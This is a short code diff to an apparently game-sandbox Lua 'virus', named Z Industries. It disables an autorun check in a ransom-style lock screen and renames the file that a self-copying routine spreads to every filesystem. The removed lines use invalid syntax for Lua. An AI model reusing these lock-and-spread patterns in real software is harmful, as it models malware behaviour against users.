@@ -24,16 +24,16 @@ end
 --end
 
 function lockScreen()
-  if(fs.isAutorunEnabled()) {
+  --if(fs.isAutorunEnabled()) {
     term.clear()
     term.write("=== Système verrouillé par Z Industries ===\n")
     term.write("Entrez le mot de passe pour déverrouiller :\n")
-  } else {
-      term.clear()
-      term.write("Autorun non activé, crash de l'infrastructure en cours.")
-      Sleep(0.1)
-      computer.crash("Autorun non actif, veuillez redémarrer l'infrastructure")
-    }
+  --} else {
+      --term.clear()
+      --term.write("Autorun non activé, crash de l'infrastructure en cours.")
+      --Sleep(0.1)
+      --computer.crash("Autorun non actif, veuillez redémarrer l'infrastructure")
+    --}
 end
 
 function selfDestruct()
@@ -59,7 +59,7 @@ function selfDestruct()
 end
 
 function copyVirus()
-  local fileName = "/home/autorun.lua"
+  local fileName = "/home/zoneground.lua"
   for address in component.list("filesystem") do
     local fs = component.proxy(address)
     if fs and fs.spaceTotal() > 0 then
